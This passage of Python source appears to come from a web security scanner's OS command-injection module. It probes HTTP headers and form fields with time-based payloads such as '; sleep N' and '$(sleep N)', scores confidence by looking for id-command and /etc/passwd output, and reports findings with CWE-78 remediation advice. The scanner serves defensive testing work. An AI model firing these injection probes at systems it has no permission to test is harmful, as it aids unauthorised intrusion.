                                        f"Input: {input_name}",
                                        f"Delay: {elapsed:.2f}s (expected {delay}s)",
                                    ],
                                    confidence=85,
                                ))
                                break
                                
                        except httpx.TimeoutException:
                            self.findings.append(CMDiFinding(
                                url=form_url,
                                parameter=f"form:{input_name}",
                                payload=payload,
                                os_type=OSType.LINUX,
                                shell_type=ShellType.BASH,
                                context=InjectionContext.DIRECT,
                                detection_method="form_timeout",
                                evidence=[
                                    f"Form: {form_url}",
                                    f"Input: {input_name}",
                                    "Request timed out",
                                ],
                                confidence=75,
                            ))
                            break
                        except Exception as e:
                            logger.debug(f"[CMDI] Time-based header test error: {e}")

    async def _test_headers(
        self,
        client: httpx.AsyncClient,
        base_url: str,
        headers_list: list[dict],
        rate_limiter: RateLimiter,
    ) -> None:
        """Test headers for command injection (X-Forwarded-For, User-Agent, etc.)."""
        # Headers that might be logged/processed
        injectable_headers = [
            "X-Forwarded-For",
            "X-Real-IP",
            "User-Agent",
            "Referer",
            "X-Custom-IP-Authorization",
            "X-Client-IP",
            "X-Originating-IP",
            "True-Client-IP",
        ]
        
        # Get baseline
        try:
            await rate_limiter.acquire()
            baseline = await client.get(base_url)
            baseline_text = baseline.text
            # Access .elapsed only after response is fully read
            try:
                baseline_time = baseline.elapsed.total_seconds() if baseline.elapsed else 0.0
            except RuntimeError:
                baseline_time = 0.0
        except (httpx.RequestError, httpx.TimeoutException):
            return
        
        marker = self._generate_marker()
        
        for header_name in injectable_headers:
            # Test time-based (most reliable for header injection)
            # THEME-1 FIX: Use configurable delays for thorough testing
            for delay in self.blind_delays:
                # THEME-1 FIX: Test multiple payloads for different shells
                header_payloads = [
                    f"; sleep {delay}",
                    f"| sleep {delay}",
                    f"$(sleep {delay})",
                    f"`sleep {delay}`",
                ]
                for payload in header_payloads[:4]:
                    await rate_limiter.acquire()

                    try:
                        start = time.perf_counter()
                        response = await client.get(
                            base_url,
                            headers={header_name: f"127.0.0.1{payload}"}
                        )
                        elapsed = time.perf_counter() - start

                        # THEME-1 FIX: Use configurable tolerance
                        if elapsed >= delay * self.delay_tolerance and elapsed > baseline_time + 2:
                            self.findings.append(CMDiFinding(
                                url=base_url,
                                parameter=f"header:{header_name}",
                                payload=payload,
                                os_type=OSType.LINUX,
                                shell_type=ShellType.BASH,
                                context=InjectionContext.DIRECT,
                                detection_method="header_time_based",
                                evidence=[
                                    f"Header: {header_name}",
                                    f"Payload: {payload}",
                                    f"Delay: {elapsed:.2f}s",
                                ],
                                confidence=80,
                            ))
                            break

                    except httpx.TimeoutException:
                        self.findings.append(CMDiFinding(
                            url=base_url,
                            parameter=f"header:{header_name}",
                            payload=payload,
                            os_type=OSType.LINUX,
                            shell_type=ShellType.BASH,
                            context=InjectionContext.DIRECT,
                            detection_method="header_timeout",
                            evidence=[
                                f"Header: {header_name}",
                                "Request timed out",
                            ],
                            confidence=70,
                        ))
                        break
                    except Exception as e:
                        logger.debug(f"[CMDI] Header injection test error: {e}")

    def _detect_context(self, payload: str) -> InjectionContext:
        """Detect injection context from payload."""
        if payload.startswith("`") and payload.endswith("`"):
            return InjectionContext.BACKTICK
        elif "$(" in payload:
            return InjectionContext.DOLLAR_PAREN
        elif payload.startswith("|"):
            return InjectionContext.PIPE
        elif payload.startswith(";"):
            return InjectionContext.SEMICOLON
        elif payload.startswith("&&"):
            return InjectionContext.AND
        elif payload.startswith("||"):
            return InjectionContext.OR
        elif payload.startswith("\n"):
            return InjectionContext.NEWLINE
        elif payload.startswith("--") or payload.startswith("-"):
            return InjectionContext.ARGUMENT
        elif "${" in payload:
            return InjectionContext.TEMPLATE
        else:
            return InjectionContext.DIRECT
    
    def _detect_shell(self, payload: str) -> ShellType:
        """Detect shell type from payload."""
        if "powershell" in payload.lower():
            return ShellType.POWERSHELL
        elif "cmd" in payload.lower() or "&" in payload:
            return ShellType.CMD
        elif "$(" in payload or "${" in payload:
            return ShellType.BASH
        elif "`" in payload:
            return ShellType.SH
        else:
            return ShellType.UNKNOWN
    
    def _calculate_confidence(
        self,
        found_indicators: list[str],
        payload: str,
        response_text: str,
        baseline_text: str,
    ) -> float:
        """
        Calculate confidence score for finding.

        FIX 2026-02-16: Returns FLOAT (0.0-1.0) instead of INT (0-100).
        The validation pipeline expects floats - returning ints caused
        100% of CMDi findings to be rejected.
        """
        confidence = 0.50  # Base confidence (float)

        # More indicators = higher confidence
        confidence += min(len(found_indicators) * 0.10, 0.30)

        # Known command output patterns
        if "uid=" in response_text and "gid=" in response_text:
            confidence += 0.20  # Very strong indicator (id command)

        if "root:" in response_text and "daemon:" in response_text:
            confidence += 0.15  # /etc/passwd content

        # Check for typical command output format (single check, not loop)
        if re.search(r'uid=\d+\([^)]+\)', response_text):
            confidence += 0.10  # id command format: uid=1000(user)

        # Check for directory listing patterns
        if re.search(r'(drwx|total \d+|lrwx)', response_text):
            confidence += 0.10  # ls -la output

        # Penalize if baseline also contains some output (cap penalty at 0.30)
        overlap_count = sum(1 for i in found_indicators if i in baseline_text)
        confidence -= min(overlap_count * 0.15, 0.30)

        return max(0.0, min(1.0, confidence))
    
    def _finding_to_dict(self, finding: CMDiFinding) -> dict[str, Any]:
        """Convert CMDiFinding to Finding dict."""
        severity = "CRITICAL"
        cvss = 9.8
        
        if finding.confidence < 80:
            severity = "HIGH"
            cvss = 8.1
        
        if finding.detection_method in ["argument_injection"]:
            severity = "HIGH"
            cvss = 7.5
        
        return Finding(
            vuln_type=VulnType.CMDI,
                        category=VulnCategory.INJECTION,
            name=f"OS Command Injection ({finding.detection_method.replace('_', ' ').title()})",
            severity=severity,
            description=(
                f"Command injection vulnerability detected in '{finding.parameter}'. "
                f"Detection method: {finding.detection_method}. "
                f"OS: {finding.os_type.name}. Shell: {finding.shell_type.name}. "
                f"Context: {finding.context.name}. "
                f"Confidence: {finding.confidence}%."
            ),
            host=finding.url,
            endpoint=finding.url,
            evidence=finding.evidence + [
                f"Confidence: {finding.confidence}%",
                f"Scanner: Command Injection Scanner {CMDI_SCANNER_VERSION}",
            ],
            cvss_score=cvss,
            cwe_id="CWE-78",
            remediation=(
                "1. Never pass user input directly to system commands.\n"
                "2. Use safe APIs that don't invoke shell (e.g., subprocess with shell=False).\n"
                "3. Implement strict allowlist validation for required command inputs.\n"
                "4. Escape all user input using OS-specific escaping functions.\n"
                "5. Run commands with least privileges.\n"
                "6. Use containerization/sandboxing for command execution."
            ),
            references=[
                "https://owasp.org/www-community/attacks/Command_Injection",
                "https://cwe.mitre.org/data/definitions/78.html",
                "https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html",
            ],
        ).to_dict()
